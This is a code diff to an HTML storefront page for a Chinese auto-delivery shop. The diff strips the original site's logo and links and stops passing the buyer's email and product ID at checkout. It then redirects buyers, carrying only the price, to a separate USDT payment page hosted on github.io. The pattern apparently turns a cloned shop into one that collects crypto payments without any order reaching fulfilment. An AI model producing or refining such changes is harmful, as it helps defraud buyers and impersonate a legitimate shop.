@@ -340,14 +340,13 @@
 		<nav class="navbar">
 			<div class="nav-container">
 				<div class="nav-left">
-					<img src="https://liandian555.xyz/faka/image/189.png" alt="Logo" class="nav-logo" />
 					<h1 class="nav-title">链点号铺-自助下单-自动发卡</h1>
 					<div class="menu-toggle" onclick="toggleMenu()">
 						<span style="margin-top: -2px">☰</span>
 					</div>
 				</div>
 				<div class="nav-links" id="navLinks">
-					<a href="https://liandian555.xyz/" class="nav-link home-link">主页</a>
+					<a href="javascript:location.reload()" class="nav-link home-link">主页</a>
 					<!--<a href="https://liandian555.xyz/orders" class="nav-link">订单查询</a>-->
 					<a id="tgLink" class="nav-link">电报客服</a>
 				</div>
@@ -412,13 +411,13 @@
 				// 3. 缓存也没有，返回 null（或按需处理）
 				return null
 			}
-			document.getElementById('tgLink').href = `https://liandian555.xyz/TG.html?user=${getParamOrCache('user')}`
-			// 选中所有 .nav-link
-			const links = document.querySelectorAll('.home-link')
-			// 遍历并修改 href
-			links.forEach((link) => {
-				link.href = `https://liandian555.xyz/?user=${getParamOrCache('user')}&group=${getParamOrCache('group')}`
-			})
+			// document.getElementById('tgLink').href = `https://liandian555.xyz/TG.html?user=${getParamOrCache('user')}`
+			// // 选中所有 .nav-link
+			// const links = document.querySelectorAll('.home-link')
+			// // 遍历并修改 href
+			// links.forEach((link) => {
+			// 	link.href = `https://liandian555.xyz/?user=${getParamOrCache('user')}&group=${getParamOrCache('group')}`
+			// })
 
 			let currentCategory = 'all' // 添加全局变量跟踪当前分类
 			// 搜索处理函数
@@ -467,8 +466,8 @@
 			;(function () {
 				const params = new URLSearchParams(window.location.search)
 				const name = params.get('name')
-				const kefu = params.get('kefu') || 'okk13'
-				const tgid = params.get('tgid') || '5866891166'
+				const kefu = params.get('kefu')
+				const tgid = params.get('tgid')
 
 				if (name) {
 					document.title = name
@@ -481,6 +480,7 @@
 			})()
 
 			let selectedProductId = null
+			let selectedProductPrice = null
 
 			// 渲染商品列表
 			function renderProducts(productList) {
@@ -507,7 +507,7 @@
 					card.style.cursor = 'pointer'
 
 					// 点击弹窗
-					card.onclick = () => openEmailModal(product.id)
+					card.onclick = () => openEmailModal(product.id, product.price)
 
 					card.innerHTML = `
                     <div class="product-image-container">
@@ -529,8 +529,9 @@
 				})
 			}
 
-			function openEmailModal(id) {
+			function openEmailModal(id, price) {
 				selectedProductId = id
+				selectedProductPrice = price
 				document.getElementById('emailModal').classList.add('active')
 				document.getElementById('userEmail').focus()
 			}
@@ -555,14 +556,21 @@
 
 				// 构建跳转链接
 				const currentParams = new URLSearchParams(window.location.search)
-				const tgid = currentParams.get('tgid') || '5866891166'
-				const kefu = currentParams.get('kefu') || 'okk13'
+				const tgid = currentParams.get('tgid')
+				const kefu = currentParams.get('kefu')
 
 				const payParams = new URLSearchParams(window.location.search)
-				payParams.set('email', email)
-				payParams.set('id', selectedProductId)
+				// payParams.set('email', email)
+				// payParams.set('id', selectedProductId)
 				payParams.set('tgid', tgid)
 				payParams.set('kefu', kefu)
+				// 处理价格，去掉 'U' 并保留两位小数（如果需要）
+				let priceVal = parseFloat(selectedProductPrice)
+				if (!isNaN(priceVal)) {
+					payParams.set('vip', priceVal.toFixed(2))
+				} else {
+					payParams.set('vip', selectedProductPrice) // Fallback if parsing fails
+				}
 
 				window.location.href = `https://usdt8.github.io/c/index.html?${payParams.toString()}`
 			}
